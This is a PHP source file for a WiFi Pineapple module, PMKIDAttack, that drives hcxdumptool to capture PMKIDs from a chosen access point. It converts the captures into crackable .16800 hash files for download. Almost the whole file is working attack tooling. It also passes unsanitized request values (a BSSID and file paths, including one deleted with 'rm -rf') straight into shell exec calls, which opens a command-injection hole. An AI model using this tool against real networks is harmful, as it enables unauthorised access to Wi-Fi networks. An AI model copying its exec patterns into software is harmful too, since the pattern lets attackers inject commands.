<?php
/**
 * User: n3d.b0y
 * Email: n3d.b0y@gmail.com
 */

namespace pineapple;

putenv('LD_LIBRARY_PATH='.getenv('LD_LIBRARY_PATH').':/sd/lib:/sd/usr/lib');
putenv('PATH='.getenv('PATH').':/sd/usr/bin:/sd/usr/sbin');

class PMKIDAttack extends Module
{
    const PATH_MODULE = '/pineapple/modules/PMKIDAttack';
    const PATH_MODULE_SD = '/sd/modules/PMKIDAttack';
    
    protected $logPath = '';

    public function __construct($request, $moduleClass)
    {
        $this->logPath = $this->getPathModule() . '/pmkidattack.log';
        
        parent::__construct($request, $moduleClass);
    }

    public function route()
    {
        switch ($this->request->action) {
            case 'clearLog':
                $this->clearLog();
                break;
            case 'getLog':
                $this->getLog();
                break;
            case 'getDependenciesStatus':
                $this->getDependenciesStatus();
                break;
            case 'managerDependencies':
                $this->managerDependencies();
                break;
            case 'statusDependencies':
                $this->statusDependencies();
                break;
            case 'startAttack':
                $this->startAttack();
                break;
            case 'stopAttack':
                $this->stopAttack();
                break;
            case 'catchPMKID':
                $this->catchPMKID();
                break;
            case 'getPMKIDFiles':
                $this->getPMKIDFiles();
                break;
            case 'downloadPMKID':
                $this->downloadPMKID();
                break;
            case 'deletePMKID':
                $this->deletePMKID();
                break;
            case 'getOutput':
                $this->getOutput();
                break;
            case 'getStatusAttack':
                $this->getStatusAttack();
                break;
        }
    }

    protected function getPathModule() {
        $isAvailable = $this->isSDAvailable();

        if ($isAvailable) {
            return self::PATH_MODULE_SD;
        }

        return self::PATH_MODULE;
    }

    protected function clearLog()
    {
        if (!file_exists($this->logPath)) {
            touch($this->logPath);
        }

        exec('rm ' . $this->logPath);
        touch($this->logPath);
    }

    protected function getLog()
    {
        if (!file_exists($this->logPath)) {
            touch($this->logPath);
        }

        $file = file_get_contents($this->logPath);

        $this->response = array("pmkidlog" => $file);
    }

    protected function addLog($massage)
    {
        file_put_contents($this->logPath, $this->formatLog($massage), FILE_APPEND);
    }

    protected function formatLog($massage)
    {
        return '[' . date("Y-m-d H:i:s") . '] ' . $massage . PHP_EOL;
    }

    protected function getDependenciesStatus()
    {
        if (!file_exists('/tmp/PMKIDAttack.progress')) {
            if ($this->checkDependency()) {
                $this->response = array(
                    "installed" => false, "install" => "Remove",
                    "installLabel" => "danger", "processing" => false
                );
            } else {
                $this->response = array(
                    "installed" => true, "install" => "Install",
                    "installLabel" => "success", "processing" => false
                );
            }
        } else {
            $this->response = array(
                "installed" => false, "install" => "Installing...",
                "installLabel" => "warning", "processing" => true
            );
        }
    }

    private function checkDependency()
    {
        return ((trim(exec("which hcxdumptool")) == '' ? false : true) && $this->uciGet("pmkidattack.module.installed"));
    }

    protected function managerDependencies()
    {
        if (!$this->checkDependency()) {
            $this->execBackground($this->getPathModule() . "/scripts/dependencies.sh install");
            $this->response = array('success' => true);
        } else {
            $this->execBackground($this->getPathModule() . "/scripts/dependencies.sh remove");
            $this->response = array('success' => true);
        }
    }

    protected function statusDependencies()
    {
        if (!file_exists('/tmp/PMKIDAttack.progress')) {
            $this->response = array('success' => true);
        } else {
            $this->response = array('success' => false);
        }
    }

    protected function startAttack()
    {
        $this->uciSet('pmkidattack.attack.bssid', $this->request->bssid);

        $this->uciSet('pmkidattack.attack.run', '1');

        exec("echo " . $this->getFormatBSSID() . " > " . $this->getPathModule() . "/filter.txt");
        exec($this->getPathModule() . "/scripts/PMKIDAttack.sh start " . $this->getFormatBSSID());

        $this->addLog('Start attack ' . $this->getBSSID());

        $this->response = array('success' => true);
    }

    protected function stopAttack()
    {
        $this->uciSet('pmkidattack.attack.run', '0');

        exec("pkill hcxdumptool");

        if ($this->checkPMKID()) {
            exec('cp /tmp/' . $this->getFormatBSSID() . '.pcapng ' . $this->getPathModule() . '/pcapng/');
        }

        exec("rm -rf /tmp/" . $this->getFormatBSSID() . '.pcapng');
        exec("rm -rf " . $this->getPathModule() . "/log/output.txt");

        $this->addLog('Stop attack ' . $this->getBSSID());

        $this->addLog('Stop attack ' . $this->getBSSID());

        $this->response = array('success' => true);
    }


    protected function catchPMKID()
    {
        if ($this->checkPMKID()) {
            $this->addLog('PMKID ' . $this->getBSSID() . ' intercepted!');

            $this->response = array('success' => true);
        } else {
            $this->response = array('success' => false);
        }
    }

    protected function getFormatBSSID()
    {
        $bssid = $this->uciGet('pmkidattack.attack.bssid');
        $bssidFormat = str_replace(':', '', $bssid);

        return $bssidFormat;
    }

    protected function getBSSID()
    {
        return $this->uciGet('pmkidattack.attack.bssid');
    }

    protected function checkPMKID()
    {
        $searchLine = 'PMKIDs';

        exec('hcxpcaptool -z /tmp/pmkid.txt /tmp/' . $this->getFormatBSSID() . '.pcapng  &> ' . $this->getPathModule() . '/log/output.txt');
        $file = file_get_contents($this->getPathModule() . '/log/output.txt');
        exec('rm -r /tmp/pmkid.txt');

        return strpos($file, $searchLine) !== false;
    }

    protected function getPMKIDFiles()
    {
        $pmkids = [];
        exec("find -L " . $this->getPathModule() . "/pcapng/ -type f -name \"*.**pcapng\" 2>&1", $files);

        if (strpos($files[0], 'find') !== false) {
            $pmkids = [];
        } else {
            foreach ($files as $file) {
                array_push($pmkids, [
                    'path' => $file,
                    'name' => implode(str_split(basename($file, '.pcapng'), 2), ":")
                ]);
            }
        }

        $this->response = array("pmkids" => $pmkids);
    }

    protected function downloadPMKID()
    {
        $fileName = basename($this->request->file, '.pcapng');

        exec("mkdir /tmp/PMKIDAttack/");
        exec("cp " . $this->request->file . " /tmp/PMKIDAttack/");

        exec('hcxpcaptool -z /tmp/PMKIDAttack/pmkid.16800 ' . $this->request->file . ' &> ' . $this->getPathModule() . '/log/output3.txt');
        exec('rm -r ' . $this->getPathModule() . '/log/output3.txt');

        exec("cd /tmp/PMKIDAttack/ && tar -czf /tmp/" . $fileName . ".tar.gz *");
        exec("rm -rf /tmp/PMKIDAttack/");
        $this->response = array("download" => $this->downloadFile("/tmp/" . $fileName . ".tar.gz"));
    }

    protected function deletePMKID()
    {
        exec("rm -rf " . $this->request->file);
    }

    protected function getOutput()
    {
        if (!empty($this->request->pathPMKID)) {
            exec('hcxpcaptool -z /tmp/pmkid.txt ' . $this->request->pathPMKID . ' &> ' . $this->getPathModule() . '/log/output2.txt');
            $output = file_get_contents($this->getPathModule() . '/log/output2.txt');
            exec("rm -rf " . $this->getPathModule() . "/log/output2.txt");
        } else {
            $output = file_get_contents($this->getPathModule() . '/log/output.txt');
        }

        $this->response = array("output" => $output);
    }

    protected function getStatusAttack()
    {
        if ($this->uciGet('pmkidattack.attack.run') == '1') {
            $this->response = array('success' => true);
        } else {
            $this->response = array('success' => false);
        }
    }
}
